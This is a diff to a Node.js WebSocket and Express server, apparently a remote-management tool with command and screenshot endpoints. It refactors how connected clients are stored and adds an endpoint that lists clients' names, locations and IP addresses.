@@ -33,16 +33,15 @@ wss.on('connection', function connection(ws) {
   ws.on('message', (message) => {
     message = JSON.parse(message);
     if (message.type === 'sendCredentials') {
+
       const date = new Date()
       console.log("Client connected: " + "Client: " + message.name + " "+message.ip+" " + date.toUTCString());
-      var client={
-        ws:ws,
-        name:message.name,
-        location:message.location,
-        ip:message.ip,
-        isAlive:true
-      }
-      clients[message.name + message.location + message.ip] = client;
+      ws.name = message.name;
+      ws.location=message.location;
+      ws.ip=message.ip;
+      ws.parameters=message.path;
+      ws.isAlive=true;
+      clients[message.name + message.location + message.ip] = ws;
       responseMap[message.name + message.location + message.ip] = emptyPromise(); 
     }
     else if (message.type === "command_result"){
@@ -125,6 +124,17 @@ app.post('/api/command', async (req, res) => {
     res.statusCode = 404;
     res.json(errResp);
   }
+});
+
+app.get('/online/', async(req,res) =>{
+
+    const niz=[];
+    for(var k in clients){
+      niz.push(clients[k].name+" "+clients[k].location+" "+clients[k].ip)
+    }
+
+    res.send(niz);
+
 });
 
 app.post('/api/screenshot', async (req, res) => {
